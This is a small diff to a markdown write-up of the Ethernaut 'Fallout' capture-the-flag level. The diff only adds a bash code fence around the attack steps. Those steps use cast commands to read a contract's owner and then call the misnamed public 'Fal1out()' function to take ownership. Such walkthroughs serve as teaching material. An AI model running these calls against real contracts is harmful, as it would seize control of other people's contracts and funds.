@@ -10,10 +10,12 @@ This mismatch means that `Fal1out` is not a constructor function but a regular p
 
 ## Attack
 
+```bash
 1. await contract.address
 2. # await contract.owner()
    cast call $CONTRACT_ADDRESS "owner()" --rpc-url $ALCHEMY_RPC_URL
 3. cast send $CONTRACT_ADDRESS "Fal1out()" --value 0.000000000000000001ether --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL
+```
 
 ## Fix
 
